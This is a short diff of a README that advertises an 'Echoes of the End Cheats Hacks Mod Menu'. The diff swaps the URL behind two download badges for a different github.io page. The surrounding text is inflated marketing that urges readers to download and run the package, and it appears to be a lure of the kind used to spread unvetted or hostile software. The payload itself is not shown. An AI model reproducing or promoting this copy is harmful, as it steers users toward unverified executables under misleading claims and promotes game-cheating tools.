@@ -75,7 +75,7 @@ Our global team offers round-the-clock assistance via chat, email, and forums. Y
 
 Ready to embark on your journey to the ultimate gameplay?  
 **Download Echoes of the End Cheats Hacks Mod Menu from here:**  
-[![Download](https://img.shields.io/badge/Download-blue)](https://albirj1.github.io/)
+[![Download](https://img.shields.io/badge/Download-blue)](albirj.github.io)
 
 **Quick Start:**
 1. Download the package above.
@@ -129,8 +129,9 @@ For details, read [LICENSE](LICENSE).
 # 📦 Final Download  
 
 Unlock your adventure today:  
-[![Download](https://img.shields.io/badge/Download-blue)](https://albirj1.github.io/)
+[![Download](https://img.shields.io/badge/Download-blue)](albirj.github.io)
 
 ---
+
 
 Thank you for embarking on this journey with us. Discover, enhance, and redefine your Echoes of the End experience — with intelligent tools that empower every gamer. ✨
